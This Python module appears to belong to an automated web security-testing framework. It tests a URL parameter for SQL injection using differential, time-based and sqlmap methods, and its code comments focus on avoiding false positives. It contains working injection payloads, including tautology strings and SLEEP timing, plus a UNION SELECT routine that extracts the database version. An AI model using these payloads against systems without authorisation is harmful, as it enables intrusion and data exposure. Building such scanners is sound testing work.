"""SQL Injection actions."""

import json
import re

from actions.registry import action, ActionContext, ActionResult
from core.validators import inject_param
from core.verification_oracle import VerificationOracle
from tools.external import tool_available
from tools.wrappers import curl

# Statuses that mean the server declined the request.
_CLIENT_ERROR = (400, 401, 403, 404, 405, 409, 422)

# Some backends report the database error *as* the rejection, so a 400 carrying
# one of these is still an injection. Rejecting the status code alone would
# hide a real finding behind a tidy rule.
_DB_ERROR = re.compile(
    r"sql|syntax error|mysql|sqlite|postgres|oracle|ora-\d+|sequelize|"
    r"pg_|database|jdbc|odbc",
    re.IGNORECASE,
)


def _refused(base_raw: dict, test_raw: dict) -> bool:
    """True when a 2xx baseline turns into a client error on injection.

    Input rejection and query execution are indistinguishable in a response
    fingerprint. They are not the same thing, and the difference decides
    whether a finding exists.
    """
    base_status = int(base_raw.get("status") or 0)
    test_status = int(test_raw.get("status") or 0)
    if not (200 <= base_status < 300) or test_status not in _CLIENT_ERROR:
        return False
    return not _DB_ERROR.search(str(test_raw.get("body") or ""))


def _path_probe(url: str, param: str) -> bool:
    """Does this probe put the payload in the path rather than in a query?

    `inject_param` fills a `{id}` placeholder in place, so the payload decides
    which resource the router resolves: `/rest/products/1'/reviews` is simply
    a product that does not exist, and the server answers `200
    {"data":[]}` for it. The differential then sees a 92% body change against
    `/rest/products/1/reviews` and calls it injection. A query parameter
    cannot change which row the route looks up, so the same divergence there
    stays evidence — only path segments get this extra gate.
    """
    return "{" + param + "}" in str(url)


def _db_signature(base_raw: dict, test_raw: dict) -> bool:
    """Did either side of the differential come back with a database error?"""
    for raw in (base_raw, test_raw):
        if _DB_ERROR.search(str(raw.get("body") or "")):
            return True
        if int(raw.get("status") or 0) >= 500:
            return True
    return False


# Closer prefix, then (backend fingerprint, version function) pairs. The
# backend order follows the error text when one exists; otherwise every
# dialect is tried cheapest-first. All read-only: version strings only,
# never table contents.
_CLOSERS = ["'", "')", "'))", '"', '"))']

_VERSION_PROBES = (
    ("sqlite", ("sqlite", "sqlite_master"),
     "sqlite_version()"),
    ("mysql", ("mysql", "mariadb", "mysqli"),
     "version()"),
    ("postgres", ("postgres", "pg_", "sequelize"),
     "version()"),
    ("mssql", ("mssql", "sqlserver", "odbc"),
     "@@version"),
)


async def _union_confirm(url: str, param: str, method: str,
                         evidence: dict) -> dict | None:
    """Prove impact beyond divergence: column count + version extraction.

    ORDER BY increments find the column count (an out-of-range error or
    a stable 200 maps the boundary), then a UNION SELECT plants a
    version function in the first column. A version string the baseline
    never contained, appearing in the UNION response, is data leaving
    the database through the injection — read-only (one scalar), but
    past any doubt about whether the flaw executes.
    """
    text = json.dumps(evidence, default=str)
    ordered_backends = sorted(
        _VERSION_PROBES,
        key=lambda probe: 0 if probe[1][0] in text.lower()
        or any(marker in text.lower() for marker in probe[1]) else 1,
    )

    closer = await _find_closer(url, param, method)
    if not closer:
        return None
    columns = await _column_count(url, param, method, closer)
    if not columns:
        return None
    for backend, _markers, version_fn in ordered_backends:
        version = await _union_version(url, param, method, closer,
                                       columns, version_fn)
        if version:
            return {"backend": backend, "columns": columns,
                    "version": version,
                    "technique": "union_version_extraction"}
    return None


async def _injected_body(url: str, param: str, method: str,
                       expression: str) -> tuple:
    """(status, body) for one injected request; failures as (0, '')."""
    try:
        result = await curl(inject_param(url, param, expression),
                            method=method, output="full", timeout=15)
    except Exception:
        return 0, ""
    return result.get("status", 0), result.get("body", "") or ""


def _looks_like_db_error(body: str) -> bool:
    return bool(_DB_ERROR.search(body or ""))


async def _find_closer(url: str, param: str, method: str) -> str:
    """Which quote/paren prefix yields valid syntax (ORDER BY 1 clean)?"""
    for closer in _CLOSERS:
        status, body = await _injected_body(
            url, param, method, f"{closer} ORDER BY 1--")
        if status in (200, 201) and not _looks_like_db_error(body):
            return closer
    return ""


async def _column_count(url: str, param: str, method: str,
                       closer: str) -> int:
    """ORDER BY increments until the backend complains (max 12 probes)."""
    for index in range(2, 14):
        status, body = await _injected_body(
            url, param, method, f"{closer} ORDER BY {index}--")
        if status not in (200, 201) or _looks_like_db_error(body):
            return index - 1
    return 0


async def _union_version(url: str, param: str, method: str, closer: str,
                         columns: int, version_fn: str) -> str:
    """UNION a version function into column one; return it if novel."""
    cells = ",".join(["NULL"] * (columns - 1))
    expression = (f"{closer} UNION SELECT {version_fn}"
                  + (f",{cells}" if cells else "") + "--")
    status, body = await _injected_body(url, param, method, expression)
    if status not in (200, 201):
        return ""
    for candidate in re.findall(r"\d+\.\d+(?:\.\d+)?", body):
        baseline_probe = await _injected_body(url, param, method, "1")
        if candidate not in (baseline_probe[1] or ""):
            return candidate
    return ""


@action(
    id="web.sqli.detect",
    risk="MEDIUM",
    detectability="high",
    requires=["url", "param"],
    produces="VulnCandidate",
    tools=["curl"],
    idempotent=True,
    timeout=180,
    description="Test a single parameter for SQL injection using differential analysis",
    category="web",
)
async def detect_sqli(ctx: ActionContext) -> ActionResult:
    url = ctx.params["url"]
    param = ctx.params["param"]
    method = ctx.params.get("method", "GET")

    oracle = VerificationOracle()
    payloads = [
        "'", "\"", "')", "' OR '1'='1", "\" OR \"1\"=\"1",
        "' UNION SELECT NULL--", "' AND 1=1--", "' AND 1=2--",
    ]

    rejected: list[dict] = []
    path_divergence: list[dict] = []

    for payload in payloads:
        test_url = inject_param(url, param, payload)
        base_url = inject_param(url, param, "1")

        verdict, base_raw, test_raw = await oracle.differential.compare_urls(
            base_url, test_url, method=method)

        if verdict.confidence.value in ("FIRM", "CONFIRMED") and _refused(
                base_raw, test_raw):
            # Divergence here means the server declined the value, not that it
            # executed it. `/api/Products/1'` is not an id, so a server that
            # answers 404 has behaved correctly — and a differential oracle
            # that cannot see that difference will report twelve endpoints as
            # injectable the first time anyone probes a typed path segment.
            rejected.append({"payload": payload,
                             "baseline_status": base_raw.get("status"),
                             "test_status": test_raw.get("status"),
                             "test_body": str(test_raw.get("body") or "")[:200]})
            continue

        if (verdict.confidence.value in ("FIRM", "CONFIRMED")
                and _path_probe(url, param)
                and not _db_signature(base_raw, test_raw)):
            # Same trap, one notch looser: both sides answer 200, so the
            # refusal check never fires, and what actually changed is which
            # resource the path resolved to. A finding here would be a
            # missing row wearing an injection's confidence label.
            path_divergence.append(
                {"payload": payload,
                 "baseline_status": base_raw.get("status"),
                 "test_status": test_raw.get("status"),
                 "test_body": str(test_raw.get("body") or "")[:200],
                 "reason": "path segment changed resource, no database error"})
            continue

        if verdict.confidence.value in ("FIRM", "CONFIRMED"):
            repro = await oracle.reproducibility.check(
                lambda: oracle.differential.test(test_url, method=method)
            )
            confidence = "CONFIRMED" if repro.confidence.value == "CONFIRMED" else "FIRM"
            union_proof = await _union_confirm(
                url, param, method, verdict.evidence)
            data = {
                "url": url,
                "param": param,
                "payload": payload,
                "technique": "differential",
            }
            evidence = {
                "differential": verdict.evidence,
                "reproducibility": repro.evidence,
                "refused_as_input_error": rejected,
                "path_divergences": path_divergence,
            }
            if union_proof:
                data["union_confirmation"] = union_proof
                evidence["union_confirmation"] = union_proof
            return ActionResult(
                success=True,
                confidence=confidence,
                data=data,
                evidence=evidence,
            )

    if rejected:
        # Say *why* it cleared. "no SQLi detected" alone cannot be told apart
        # from never having reached an endpoint, and that is the difference
        # between a tested surface and a skipped one.
        statuses = sorted({str(r["test_status"]) for r in rejected})
        return ActionResult(
            False,
            error=f"no SQLi detected; {len(rejected)} payload(s) rejected as "
                  f"invalid input (HTTP {', '.join(statuses)})",
            confidence="TENTATIVE",
            data={"refused_as_input_error": rejected},
        )

    if path_divergence:
        statuses = sorted({str(r["test_status"]) for r in path_divergence})
        return ActionResult(
            False,
            error=f"no SQLi detected; {len(path_divergence)} payload(s) "
                  f"changed the path segment's resource with no database "
                  f"signature (HTTP {', '.join(statuses)})",
            confidence="TENTATIVE",
            data={"path_divergences": path_divergence},
        )

    return ActionResult(False, error="no SQLi detected with test payloads",
                        confidence="TENTATIVE")


@action(
    id="web.sqli.blind_detect",
    risk="MEDIUM",
    detectability="high",
    requires=["url", "param"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=300,
    description="Test for blind/time-based SQL injection using statistical timing",
    category="web",
)
async def detect_blind_sqli(ctx: ActionContext) -> ActionResult:
    url = ctx.params["url"]
    param = ctx.params["param"]
    method = ctx.params.get("method", "GET")

    oracle = VerificationOracle()

    true_payload = "' OR SLEEP(3)--"
    false_payload = "' AND SLEEP(0)--"

    verdict = await oracle.verify_blind_sqli(url, param, true_payload, false_payload)

    if verdict.confidence.value in ("FIRM", "CONFIRMED"):
        return ActionResult(
            success=True,
            confidence=verdict.confidence.value,
            data={
                "url": url,
                "param": param,
                "payload": true_payload,
                "technique": "time-based",
            },
            evidence=verdict.evidence,
        )

    return ActionResult(False, error="no blind SQLi detected",
                        confidence="TENTATIVE")


@action(
    id="web.sqli.sqlmap",
    risk="HIGH",
    detectability="high",
    requires=["url"],
    produces="VulnCandidate",
    tools=["sqlmap"],
    idempotent=True,
    timeout=900,
    description="Run sqlmap against a parameterized URL for deep SQLi testing",
    category="web",
)
async def sqlmap_sqli(ctx: ActionContext) -> ActionResult:
    if not tool_available("sqlmap"):
        return ActionResult(False, error="sqlmap not installed",
                            confidence="TENTATIVE")

    from tools.external import sqlmap_scan
    url = ctx.params["url"]
    result = await sqlmap_scan(url, timeout=ctx.timeout or 900)

    findings = result.get("results", [])
    if findings:
        return ActionResult(
            success=True,
            confidence="FIRM",
            data={"url": url, "findings": findings},
            evidence={
                "sqlmap": {
                    "target": url,
                    "findings": findings,
                    "exit_code": result.get("exit_code"),
                }
            },
        )

    return ActionResult(False, error="sqlmap found no vulnerabilities",
                        confidence="TENTATIVE")
